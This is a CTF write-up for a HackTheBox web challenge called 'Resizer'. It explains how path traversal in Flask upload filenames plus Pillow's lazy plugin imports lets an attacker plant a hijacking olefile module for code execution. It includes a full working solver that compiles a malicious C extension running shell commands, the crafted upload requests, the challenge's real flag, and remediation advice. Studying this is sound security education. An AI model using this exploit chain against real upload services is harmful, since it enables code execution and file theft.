---
title: "WEB - Resizer"
date: 2026-05-10
tags: ["HackTheBox","Web","Hard"]
categories: ["Machines&Challenges"]
difficulty: "Hard"
author: "z3r0s"
---
# Resizer Writeup

## Challenge

- Name: `Resizer`
- Category: `Web`
- Target: `http://154.57.164.66:30462`

## TL;DR

The core bug is an **arbitrary file write through path traversal** in the upload filename:

```python
filename = file.filename
filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
file.save(filepath)
```

Because `filename` is never sanitized with `secure_filename()` and `os.path.join()` does not stop `../`, we can write files outside `uploads/`.

That by itself is not enough to read the flag, because:

- the app blocks overwriting existing files with `os.path.exists(filepath)`
- the app immediately calls Pillow on the uploaded file
- there is no direct route to read arbitrary files

The full exploit is:

1. Upload a malicious shared object as `../olefile.abi3.so`
2. Trigger Pillow's plugin auto-import during `Image.open()`
3. Pillow imports `olefile` from the app root instead of the real package
4. Our module executes code on import and writes the flag into `/app/uploads/<name>_resized.txt`
5. A second upload makes Flask return that file with `send_file()`

## Source Analysis

### 1. Vulnerable upload path

From [app.py](/home/kali/Downloads/challenge/app.py):

```python
filename = file.filename
filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
if os.path.exists(filepath):
    return "File already exists. Please rename your file and try again.", 400
file.save(filepath)
```

`UPLOAD_FOLDER` is only `uploads`, so a filename like `../something` escapes the directory.

### 2. Blacklist is ineffective

The application tries to block Python files:

```python
BLACKLISTED_EXTENTIONS = {'.py', '.pyc'}
CONTENT_TYPE_BLACKLIST = {
    'application/x-python-code',
    'application/x-python-bytecode',
    'text/x-python'
}
```

This misses native extension modules such as:

- `.so`
- `.abi3.so`

So we can still plant executable Python import targets.

### 3. Uploaded file is opened by Pillow

After saving, the server calls:

```python
resizer(800, 800, "resize", filepath)
```

Then in [utils/helpers.py](/home/kali/Downloads/challenge/utils/helpers.py):

```python
with Image.open(image_path) as img:
    img = img.resize((x, y))
    img.save(new_image_path)
```

That means every upload reaches `PIL.Image.open()`.

## Why Simple Traversal Is Not Enough

At first glance, path traversal suggests:

- overwrite a template
- overwrite app code
- overwrite the flag

But the check below blocks replacing existing files:

```python
if os.path.exists(filepath):
    return "File already exists. Please rename your file and try again.", 400
```

So direct overwrite of:

- `app.py`
- `templates/index.html`
- `flag.txt`

does not work.

The challenge is turning a **new-file arbitrary write** into something executable.

## Turning File Write Into Code Execution

### Pillow import behavior

`Image.open()` does not just parse the file. It can also initialize additional plugins. During this process Pillow imports modules lazily.

One useful plugin is `FpxImagePlugin`, which imports the top-level module `olefile`.

That matters because the application runs from `/app`, and Python can import from the current working directory. If we can write:

```text
/app/olefile.abi3.so
```

then Python may resolve `import olefile` to our malicious module instead of the legitimate package.

### Why `.abi3.so`

Using `.abi3.so` is cleaner than a version-specific filename such as:

```text
olefile.cpython-313-x86_64-linux-gnu.so
```

because Python accepts ABI3 extension modules across compatible versions. This avoids guessing the exact remote micro-version.

## Exploit Strategy

### Stage 1: plant the malicious module

Upload:

```text
filename=../olefile.abi3.so
```

This writes:

```text
/app/olefile.abi3.so
```

The request usually ends in `500` because Pillow then tries to process the uploaded `.so` as an image and fails. That is fine; the file is already written.

### Stage 2: trigger import and drop the flag into a returned file

Upload a non-image file with a chosen name such as:

```text
zzflag2026.txt
```

The server computes the returned resized filename as:

```text
uploads/zzflag2026_resized.txt
```

When Pillow attempts to identify the file, it initializes plugins, reaches `FpxImagePlugin`, imports `olefile`, and loads our malicious shared object.

Our module runs code during `PyInit_olefile()` and writes the real flag to:

```text
/app/uploads/zzflag2026_resized.txt
```

After that, Flask executes:

```python
return send_file(new_resize_path, as_attachment=True, ...)
```

and returns the flag file directly.

## Malicious Module Logic

The payload used in the solver:

- runs at import time
- searches likely flag paths:
  - `/flag*`
  - `/app/flag*`
  - `/app/*flag*`
- filters for strings containing `HTB{`
- ignores the known fake flag marker `f4k3_fl4g`
- writes the first real match to `/app/uploads/<marker>_resized.txt`

This avoids depending on the exact flag filename.

## Full Solver

```
#!/usr/bin/env python3
import argparse
import http.client
import os
import pathlib
import random
import string
import subprocess
import sys
import sysconfig
import tempfile
import urllib.parse


def rand_tag(length=8):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def build_payload(shared_object_path, marker):
    c_source = f"""#define Py_LIMITED_API 0x03080000
#include <Python.h>
#include <stdlib.h>

static struct PyModuleDef mod = {{
    PyModuleDef_HEAD_INIT,
    "olefile",
    NULL,
    -1,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL
}};

PyMODINIT_FUNC PyInit_olefile(void) {{
    system("/bin/sh -c 'for f in /flag* /app/flag* /app/*flag*; do [ -f \\"$f\\" ] || continue; c=$(cat \\"$f\\" 2>/dev/null); echo \\"$c\\" | grep -q \\"HTB{{\\" || continue; echo \\"$c\\" | grep -q \\"f4k3_fl4g\\" && continue; printf \\"%s\\" \\"$c\\" > /app/uploads/{marker}_resized.txt; exit 0; done; echo no_real_flag_found > /app/uploads/{marker}_resized.txt'");
    return PyModule_Create(&mod);
}}
"""

    src_path = pathlib.Path(shared_object_path).with_suffix(".c")
    src_path.write_text(c_source)

    include_dir = sysconfig.get_paths()["include"]
    cmd = [
        "gcc",
        "-shared",
        "-fPIC",
        "-O2",
        f"-I{include_dir}",
        "-o",
        shared_object_path,
        str(src_path),
    ]
    subprocess.run(cmd, check=True)


def encode_multipart(field_name, filename, content_type, data):
    boundary = "----resizer-" + rand_tag(16)
    body = []
    body.append(f"--{boundary}\r\n".encode())
    body.append(
        (
            f'Content-Disposition: form-data; name="{field_name}"; '
            f'filename="{filename}"\r\n'
        ).encode()
    )
    body.append(f"Content-Type: {content_type}\r\n\r\n".encode())
    body.append(data)
    body.append(f"\r\n--{boundary}--\r\n".encode())
    payload = b"".join(body)
    return boundary, payload


def post_file(base_url, filename, content_type, data):
    parsed = urllib.parse.urlparse(base_url)
    scheme = parsed.scheme or "http"
    host = parsed.hostname
    port = parsed.port
    path = parsed.path.rstrip("/") + "/resize" if parsed.path else "/resize"

    if scheme == "https":
        conn = http.client.HTTPSConnection(host, port or 443, timeout=15)
    else:
        conn = http.client.HTTPConnection(host, port or 80, timeout=15)

    boundary, payload = encode_multipart("file", filename, content_type, data)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(payload)),
    }
    conn.request("POST", path, body=payload, headers=headers)
    resp = conn.getresponse()
    body = resp.read()
    conn.close()
    return resp.status, dict(resp.getheaders()), body


def extract_flag(data):
    text = data.decode("utf-8", errors="ignore")
    start = text.find("HTB{")
    if start == -1:
        return None
    end = text.find("}", start)
    if end == -1:
        return None
    return text[start : end + 1]


def main():
    parser = argparse.ArgumentParser(description="Solve the Resizer web challenge")
    parser.add_argument(
        "target",
        nargs="?",
        default="http://154.57.164.66:30462",
        help="Base target URL",
    )
    args = parser.parse_args()

    base_url = args.target.rstrip("/")
    marker = "resizer_" + rand_tag(8)
    fallback_markers = [marker, "zzflag2026"]

    with tempfile.TemporaryDirectory() as tmpdir:
        so_path = os.path.join(tmpdir, "olefile.abi3.so")
        build_payload(so_path, marker)

        stage1_data = pathlib.Path(so_path).read_bytes()
        status1, _, body1 = post_file(
            base_url,
            "../olefile.abi3.so",
            "application/octet-stream",
            stage1_data,
        )
        print(f"[+] Stage 1 status: {status1}")
        if body1:
            print(f"[+] Stage 1 body: {body1.decode('utf-8', errors='ignore').strip()}")

        trigger_data = b"notanimage"
        last_body = b""
        for current_marker in fallback_markers:
            status2, headers2, body2 = post_file(
                base_url,
                f"{current_marker}.txt",
                "text/plain",
                trigger_data,
            )
            print(f"[+] Stage 2 status for {current_marker}: {status2}")
            disposition = headers2.get("Content-Disposition", "")
            if disposition:
                print(f"[+] Content-Disposition: {disposition}")

            flag = extract_flag(body2)
            if flag:
                print(f"[+] Flag: {flag}")
                return
            last_body = body2

        sys.stderr.write("[-] Flag not found in response body\n")
        if status1 == 400:
            sys.stderr.write(
                "[-] The target may already contain a previously uploaded olefile payload or trigger file. Reset the instance and rerun.\n"
            )
        sys.stderr.write(last_body.decode("utf-8", errors="ignore") + "\n")
        sys.exit(1)


if __name__ == "__main__":
    main()

```

Usage:

```bash

python3 solve.py http://154.57.164.66:30462
```

Note:

- the solver is intended for a fresh challenge instance
- if you already uploaded `olefile.abi3.so` or used the same trigger filename before, reset the target first

What it does:

1. Builds a malicious `olefile.abi3.so`
2. Uploads it using path traversal
3. Sends a second trigger upload
4. Prints the returned flag

## Exploit Walkthrough

### 1. Build payload

Compile a Python extension module that exports:

```c
PyMODINIT_FUNC PyInit_olefile(void)
```

Its initializer executes shell commands to read the real flag and write it into the predictable `*_resized.txt` path.

### 2. Upload the module

Request:

```http
POST /resize
Content-Disposition: form-data; name="file"; filename="../olefile.abi3.so"
```

Expected result:

- file is written successfully outside `uploads/`
- response may be `500`

### 3. Trigger lazy import

Second request:

```http
POST /resize
Content-Disposition: form-data; name="file"; filename="zzflag2026.txt"
```

Pillow attempts to identify the bogus file and imports plugins.

### 4. Receive flag

The server responds with:

```text
Content-Disposition: attachment; filename=zzflag2026_resized.txt
```

and the response body contains the flag.

## Real Flag

```text
HTB{f0c0218e331f78db2482e3c25a10e09f}
```

## Root Cause

This challenge is best described as:

- **Path traversal in uploaded filename**
- leading to **arbitrary file write**
- escalated through **Python module import hijacking**
- triggered by **Pillow lazy plugin imports**

## Fixes

To fix the application properly:

1. Sanitize uploaded filenames with `werkzeug.utils.secure_filename()`
2. Reject any path separators and normalize paths before saving
3. Generate server-side random filenames instead of trusting user input
4. Store uploads outside the application import path
5. Use an allowlist of image extensions and verify actual image content
6. Do not rely on blacklists such as `.py` and `.pyc`

## Minimal Patch Direction

Instead of:

```python
filename = file.filename
filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
```

use something like:

```python
from werkzeug.utils import secure_filename
import uuid

safe_name = secure_filename(file.filename)
filename = f"{uuid.uuid4().hex}_{safe_name}"
filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
```

and ensure `UPLOAD_FOLDER` is outside the app root.

